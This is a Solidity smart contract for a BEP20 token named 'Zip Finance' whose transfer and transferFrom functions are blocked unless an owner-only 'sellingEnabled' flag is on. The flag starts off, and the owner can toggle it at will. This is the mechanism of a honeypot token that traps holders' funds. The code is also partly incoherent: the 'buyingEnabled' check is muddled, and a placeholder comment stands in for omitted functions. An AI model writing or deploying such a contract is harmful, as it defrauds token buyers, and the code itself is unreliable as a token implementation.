// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ZipFinance is IBEP20 {
    string public name = "Zip Finance";
    string public symbol = "ZIPFI";
    uint8 public decimals = 18;
    uint256 private _totalSupply = 999099099900900999 * 10**uint256(decimals);
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private owner;
    bool public sellingEnabled = false;
    bool public buyingEnabled = true;

    constructor() {
        _balances[msg.sender] = _totalSupply;
        owner = msg.sender;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(buyingEnabled || recipient != address(this), "Transfers to this contract are currently disabled");
        require(sellingEnabled, "Selling is currently disabled");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(_balances[msg.sender] >= amount, "BEP20: transfer amount exceeds balance");

        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(buyingEnabled || recipient != address(this), "Transfers to this contract are currently disabled");
        require(sellingEnabled, "Selling is currently disabled");
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(_balances[sender] >= amount, "BEP20: transfer amount exceeds balance");
        require(_allowances[sender][msg.sender] >= amount, "BEP20: transfer amount exceeds allowance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    // ... (other functions)

    function enableSelling() external onlyOwner {
        sellingEnabled = true;
    }

    function disableSelling() external onlyOwner {
        sellingEnabled = false;
    }

    function enableBuying() external onlyOwner {
        buyingEnabled = true;
    }

    function disableBuying() external onlyOwner {
        buyingEnabled = false;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }
}